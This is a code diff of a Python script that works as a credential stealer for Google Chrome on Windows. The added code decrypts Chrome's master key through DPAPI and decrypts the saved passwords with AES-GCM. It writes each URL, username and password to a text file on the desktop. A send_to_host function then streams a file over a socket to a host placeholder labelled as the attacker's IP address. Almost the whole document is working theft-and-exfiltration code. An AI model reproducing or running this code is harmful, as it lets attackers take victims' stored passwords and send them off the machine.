@@ -1,37 +1,76 @@
+from Cryptodome.Cipher import AES
 import os
 import sqlite3
+import json
+import shutil
+import base64
 import win32crypt
 import tqdm
 import socket
 
 SEPARATOR = "<SEPARATOR>"
 BUFFER_SIZE = 4096
-host = "YOUR IP ADDRESS"
+host = "atckers ip adress"
 port = 5001 # you can change it any available port , do so in both client and server side scripts
 
 
 def get_chrome():
-    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
-    c = sqlite3.connect(data_path)
-    cursor = c.cursor()
-    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
-    cursor.execute(select_statement)
+    def get_master_key():
+         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
+                local_state = f.read()
+                local_state = json.loads(local_state)
+         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+         master_key = master_key[5:]  # removing DPAPI
+         master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+         return master_key
 
-    login_data = cursor.fetchall()
+    def decrypt_payload(cipher, payload):
+        return cipher.decrypt(payload)
 
-    cred = {}
+    def generate_cipher(aes_key, iv):
+        return AES.new(aes_key, AES.MODE_GCM, iv)
 
-    string = ''
+    def decrypt_password(buff, master_key):
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = generate_cipher(master_key, iv)
+            decrypted_pass = decrypt_payload(cipher, payload)
+            decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
+            return decrypted_pass
+        except Exception as e:
+             # print("Probably saved password from Chrome version older than v80\n")
+             # print(str(e))
+            return "Chrome < 80"
+ 
 
-    for url, user_name, pwd in login_data:
-        pwd = win32crypt.CryptUnprotectData(pwd)
-        cred[url] = (user_name, pwd[1].decode('utf8'))
-        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
-        passtxt = open(r'C:\Users\pc\Desktop\passtxt.txt','a')
-        passtxt.write(string)
-        print(string)
+    master_key = get_master_key()
+    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
+    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+    conn = sqlite3.connect("Loginvault.db")
+    cursor = conn.cursor()
+    try:
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            decrypted_password = decrypt_password(encrypted_password, master_key)
+            if len(username) > 0:
+                string = ("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                print(string)
+                passtxt = open(os.path.expanduser('~') + r'\Desktop\passtxt.txt','a')
+                passtxt.write(string)
+    except Exception as e:
+        pass
+    cursor.close()
+    conn.close()
+    try:
+        os.remove("Loginvault.db")
+    except Exception as e:
+        pass
 
-def send_to_host:
+def send_to_host():
     s = socket.socket()
     print(f"[+] Connecting to {host}:{port}")
     s.connect((host, port))
@@ -46,7 +85,7 @@ def send_to_host:
             bytes_read = f.read(BUFFER_SIZE)
             if not bytes_read:
                 break
-        
+       
             s.sendall(bytes_read)
             progress.update(len(bytes_read))
 
